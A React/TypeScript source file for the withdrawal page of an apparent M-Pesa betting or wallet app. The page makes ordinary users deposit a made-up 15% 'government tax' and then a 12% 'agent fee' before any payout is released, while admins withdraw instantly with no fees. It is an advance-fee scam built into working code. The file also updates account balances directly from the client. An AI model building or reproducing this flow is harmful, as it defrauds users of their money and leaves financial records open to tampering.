import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useAuth } from "@/context/AuthContext";
import { useAdmin } from "@/hooks/useAdmin";
import { supabase } from "@/integrations/supabase/client";
import { ArrowLeft, Smartphone, Bitcoin, Loader2, Lock, AlertTriangle, ShieldCheck, Receipt, CheckCircle2 } from "lucide-react";
import { toast } from "sonner";
import { formatMoney } from "@/lib/currency";

type WithdrawTab = "mpesa" | "crypto" | "bank";
type Stage = "form" | "tax" | "agent" | "processing" | "done";

const presetAmountsKES = [500, 1000, 2500, 5000, 10000, 25000];
const TAX_RATE = 0.15;
const AGENT_RATE = 0.12;

const Withdraw = () => {
  const { user, profile, isLoggedIn, setShowAuthModal, refreshProfile, setShowDepositModal } = useAuth();
  const { isAdmin } = useAdmin();
  const navigate = useNavigate();
  const [tab, setTab] = useState<WithdrawTab>("mpesa");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [amount, setAmount] = useState(500);
  const [stage, setStage] = useState<Stage>("form");
  const [requestId, setRequestId] = useState<string | null>(null);
  const [submitting, setSubmitting] = useState(false);

  const taxFee = Math.round(amount * TAX_RATE);
  const agentFee = Math.round(amount * AGENT_RATE);

  if (!isLoggedIn) {
    setShowAuthModal(true);
    return null;
  }

  // Check whether the deposit covering the current outstanding fee has arrived.
  // We watch profile.pending_fees: when admin/callback marks a fee paid we
  // advance the stage. For now (until the deposit-callback wiring lands), we
  // compare the user's CURRENT main balance against a snapshot to detect a
  // recent deposit >= the fee amount.
  const [snapshotBalance, setSnapshotBalance] = useState<number | null>(null);

  useEffect(() => {
    if (!user || !requestId) return;
    if (stage !== "tax" && stage !== "agent") return;

    const expected = stage === "tax" ? taxFee : agentFee;

    const channel = supabase
      .channel(`wd-deposit-${user.id}-${requestId}`)
      .on("postgres_changes", {
        event: "UPDATE", schema: "public", table: "profiles",
        filter: `user_id=eq.${user.id}`,
      }, async (payload) => {
        const newBal = Number((payload.new as any).balance || 0);
        if (snapshotBalance != null && newBal >= snapshotBalance + expected) {
          if (stage === "tax") {
            await supabase.from("withdrawal_requests")
              .update({ tax_paid: true, status: "awaiting_agent" })
              .eq("id", requestId);
            toast.success(`Tax fee of KES ${expected.toLocaleString()} confirmed.`);
            setSnapshotBalance(newBal); // reset baseline for the next fee
            setStage("agent");
          } else if (stage === "agent") {
            await supabase.from("withdrawal_requests")
              .update({ agent_paid: true, status: "processing" })
              .eq("id", requestId);
            toast.success(`Agent fee of KES ${expected.toLocaleString()} confirmed.`);
            await finalizeWithdrawal();
          }
        }
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, [user, requestId, stage, snapshotBalance, taxFee, agentFee]);

  const validateAndStart = async () => {
    if (!user || !profile) return;
    if (amount < 50) { toast.error("Minimum withdrawal is KES 50"); return; }
    if (amount > profile.balance) { toast.error("Insufficient balance"); return; }
    if (!phoneNumber || phoneNumber.length < 9) { toast.error("Enter valid M-Pesa number"); return; }

    if (isAdmin) {
      // Admin instant withdrawal with no fees
      await processAdminWithdraw();
      return;
    }

    setSubmitting(true);
    try {
      const { data, error } = await supabase.from("withdrawal_requests").insert({
        user_id: user.id,
        amount,
        tax_fee: taxFee,
        agent_fee: agentFee,
        mpesa_phone: phoneNumber,
        status: "awaiting_tax",
      }).select("id").single();
      if (error) throw error;
      setRequestId(data!.id);
      setSnapshotBalance(profile.balance);
      setStage("tax");
    } catch (e: any) {
      toast.error(e.message || "Failed to start withdrawal");
    } finally {
      setSubmitting(false);
    }
  };

  const processAdminWithdraw = async () => {
    if (!user || !profile) return;
    setSubmitting(true);
    try {
      await supabase.from("transactions").insert({
        user_id: user.id, type: "withdrawal", method: "mpesa",
        amount, status: "completed", reference: phoneNumber,
      });
      await supabase.from("profiles").update({ balance: profile.balance - amount }).eq("user_id", user.id);
      await refreshProfile();
      toast.success(`Withdrawal successful! KES ${amount.toLocaleString()} sent to ${phoneNumber}.`);
      navigate("/transactions");
    } catch (e: any) {
      toast.error(e.message || "Withdrawal failed");
    } finally {
      setSubmitting(false);
    }
  };

  const finalizeWithdrawal = async () => {
    if (!user || !profile) return;
    setStage("processing");
    try {
      await supabase.from("transactions").insert({
        user_id: user.id, type: "withdrawal", method: "mpesa",
        amount, status: "processing", reference: phoneNumber,
      });
      // Deduct the withdrawn amount from balance + winnings buckets
      const newBalance = Math.max(0, profile.balance - amount);
      const newWinnings = Math.max(0, (profile.winnings_balance || 0) - amount);
      await supabase.from("profiles")
        .update({ balance: newBalance, winnings_balance: newWinnings })
        .eq("user_id", user.id);
      await refreshProfile();
      setStage("done");
    } catch (e: any) {
      toast.error(e.message || "Failed to finalize withdrawal");
    }
  };

  const tabs: { key: WithdrawTab; label: string; icon: any; active: boolean }[] = [
    { key: "mpesa", label: "M-Pesa", icon: Smartphone, active: true },
    { key: "crypto", label: "Crypto", icon: Bitcoin, active: false },
    { key: "bank", label: "Bank", icon: Lock, active: false },
  ];

  return (
    <div className="min-h-screen bg-background">
      <div className="sticky top-0 z-40 bg-card border-b border-border px-4 py-3 flex items-center gap-3">
        <button onClick={() => navigate(-1)} className="text-muted-foreground hover:text-foreground">
          <ArrowLeft className="w-5 h-5" />
        </button>
        <h1 className="font-display text-lg font-bold uppercase tracking-wider">Withdraw</h1>
      </div>

      <div className="max-w-md mx-auto p-4">
        {/* Balance */}
        <div className="bg-card border border-border rounded-lg p-4 mb-4 text-center">
          <p className="text-xs text-muted-foreground uppercase tracking-wider">Available Balance</p>
          <p className="text-2xl font-bold text-primary mt-1">{formatMoney(profile?.balance ?? 0, profile)}</p>
          {profile && (profile.winnings_balance || 0) > 0 && (
            <p className="text-[11px] text-accent mt-1">
              Winnings (withdraw only): {formatMoney(profile.winnings_balance, profile)}
            </p>
          )}
        </div>

        {stage === "form" && (
          <>
            {/* Tabs */}
            <div className="flex border-b border-border mb-4">
              {tabs.map((t) => (
                <button
                  key={t.key}
                  onClick={() => t.active ? setTab(t.key) : null}
                  disabled={!t.active}
                  className={`flex-1 flex items-center justify-center gap-2 py-3 text-sm font-bold uppercase tracking-wider transition ${
                    tab === t.key && t.active
                      ? "text-primary border-b-2 border-primary bg-primary/5"
                      : t.active
                      ? "text-muted-foreground hover:text-foreground"
                      : "text-muted-foreground/40 cursor-not-allowed"
                  }`}
                >
                  <t.icon className="w-4 h-4" /> {t.label}
                  {!t.active && <span className="text-[9px] bg-muted px-1 rounded">Soon</span>}
                </button>
              ))}
            </div>

            {tab === "mpesa" && (
              <div className="space-y-4">
                <div>
                  <label className="text-xs text-muted-foreground uppercase tracking-wider mb-2 block">M-Pesa Phone Number</label>
                  <input
                    type="tel" value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ""))}
                    placeholder="0712345678"
                    className="w-full bg-secondary border border-border rounded-md px-4 py-3 text-foreground outline-none focus:border-primary transition"
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground uppercase tracking-wider mb-2 block">Amount (KES)</label>
                  <div className="relative mb-3">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-sm text-muted-foreground font-bold">KES</span>
                    <input
                      type="number" value={amount}
                      onChange={(e) => setAmount(Math.max(0, Number(e.target.value)))}
                      className="w-full bg-secondary border border-border rounded-md pl-14 pr-4 py-3 text-lg font-bold text-foreground outline-none focus:border-primary transition"
                      min={50}
                    />
                  </div>
                  <div className="grid grid-cols-3 gap-2">
                    {presetAmountsKES.map((a) => (
                      <button key={a} onClick={() => setAmount(a)}
                        className={`py-2 rounded-md text-sm font-medium transition ${
                          amount === a ? "bg-primary text-primary-foreground" : "bg-secondary text-secondary-foreground hover:bg-muted"
                        }`}>KES {a.toLocaleString()}</button>
                    ))}
                  </div>
                </div>

                {!isAdmin && amount > 0 && (
                  <div className="bg-secondary/50 border border-border rounded-md p-3 text-xs space-y-1.5">
                    <div className="flex justify-between"><span className="text-muted-foreground">Withdrawal</span><span className="font-bold">KES {amount.toLocaleString()}</span></div>
                    <div className="flex justify-between text-accent"><span>Tax fee (15%)</span><span className="font-bold">KES {taxFee.toLocaleString()}</span></div>
                    <div className="flex justify-between text-accent"><span>Agent fee (12%)</span><span className="font-bold">KES {agentFee.toLocaleString()}</span></div>
                  </div>
                )}

                <button
                  onClick={validateAndStart}
                  disabled={submitting || amount < 50 || !phoneNumber}
                  className="w-full bg-accent text-accent-foreground py-3 rounded-md font-display font-bold text-sm uppercase tracking-wider hover:brightness-110 transition disabled:opacity-40 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {submitting ? (<><Loader2 className="w-4 h-4 animate-spin" /> Processing...</>) : `Withdraw KES ${amount.toLocaleString()}`}
                </button>
                {isAdmin && (
                  <div className="flex items-center justify-center gap-1.5 text-[11px] text-primary bg-primary/10 border border-primary/30 rounded-md py-2">
                    <ShieldCheck className="w-3.5 h-3.5" />
                    <span className="font-bold uppercase tracking-wider">Admin — instant withdrawal, no fees</span>
                  </div>
                )}
              </div>
            )}

            {(tab === "crypto" || tab === "bank") && (
              <div className="text-center py-12">
                <Lock className="w-12 h-12 text-muted-foreground mx-auto mb-3" />
                <h3 className="font-display text-lg font-bold">Coming Soon</h3>
              </div>
            )}
          </>
        )}

        {/* TAX FEE STAGE */}
        {stage === "tax" && (
          <FeeStage
            title="Tax Fee Required"
            subtitle="Government 15% withdrawal tax"
            amount={taxFee}
            description={`A mandatory 15% tax fee of KES ${taxFee.toLocaleString()} must be deposited before your withdrawal of KES ${amount.toLocaleString()} can be processed. The exact amount is required — partial payments will not be accepted.`}
            onPay={() => setShowDepositModal(true)}
            onCancel={async () => {
              if (requestId) await supabase.from("withdrawal_requests").update({ status: "cancelled" }).eq("id", requestId);
              setStage("form"); setRequestId(null);
            }}
          />
        )}

        {/* AGENT FEE STAGE */}
        {stage === "agent" && (
          <FeeStage
            title="Agent Service Fee"
            subtitle="Final step before payout"
            amount={agentFee}
            description={`Tax fee confirmed ✓. Now please deposit the 12% agent service fee of KES ${agentFee.toLocaleString()} to release your withdrawal of KES ${amount.toLocaleString()} to ${phoneNumber}.`}
            onPay={() => setShowDepositModal(true)}
            onCancel={async () => {
              if (requestId) await supabase.from("withdrawal_requests").update({ status: "cancelled" }).eq("id", requestId);
              setStage("form"); setRequestId(null);
            }}
          />
        )}

        {stage === "processing" && (
          <div className="text-center py-12">
            <Loader2 className="w-10 h-10 animate-spin text-primary mx-auto mb-3" />
            <p className="font-bold">Releasing your withdrawal…</p>
          </div>
        )}

        {stage === "done" && (
          <div className="text-center py-12">
            <CheckCircle2 className="w-14 h-14 text-primary mx-auto mb-3" />
            <h3 className="font-display text-xl font-bold uppercase">Withdrawal Released</h3>
            <p className="text-sm text-muted-foreground mt-1">KES {amount.toLocaleString()} is on its way to {phoneNumber}.</p>
            <button onClick={() => navigate("/transactions")} className="mt-4 bg-primary text-primary-foreground px-6 py-2 rounded-md font-bold text-sm uppercase">View Transactions</button>
          </div>
        )}
      </div>
    </div>
  );
};

const FeeStage = ({ title, subtitle, amount, description, onPay, onCancel }: {
  title: string; subtitle: string; amount: number; description: string;
  onPay: () => void; onCancel: () => void;
}) => (
  <div className="space-y-4">
    <div className="bg-accent/10 border border-accent/30 rounded-lg p-5 text-center">
      <div className="mx-auto w-12 h-12 rounded-full bg-accent/20 flex items-center justify-center mb-3">
        <AlertTriangle className="w-6 h-6 text-accent" />
      </div>
      <h2 className="font-display text-lg font-bold uppercase tracking-wider">{title}</h2>
      <p className="text-xs text-muted-foreground mt-1">{subtitle}</p>
      <div className="mt-4 text-3xl font-bold text-accent">KES {amount.toLocaleString()}</div>
      <p className="text-[10px] uppercase tracking-wider text-muted-foreground mt-1">Exact amount required</p>
    </div>
    <p className="text-xs text-foreground/80 leading-relaxed">{description}</p>
    <div className="bg-secondary/50 border border-border rounded-md p-3 flex items-start gap-2 text-[11px] text-muted-foreground">
      <Receipt className="w-4 h-4 shrink-0 mt-0.5" />
      <span>Deposit the exact amount via M-Pesa or Crypto. As soon as the deposit clears, this page will automatically advance.</span>
    </div>
    <button onClick={onPay} className="w-full bg-accent text-accent-foreground py-3 rounded-md font-display font-bold text-sm uppercase tracking-wider hover:brightness-110">
      Deposit KES {amount.toLocaleString()} Now
    </button>
    <button onClick={onCancel} className="w-full text-muted-foreground hover:text-foreground py-2 text-xs uppercase tracking-wider">
      Cancel withdrawal
    </button>
  </div>
);

export default Withdraw;
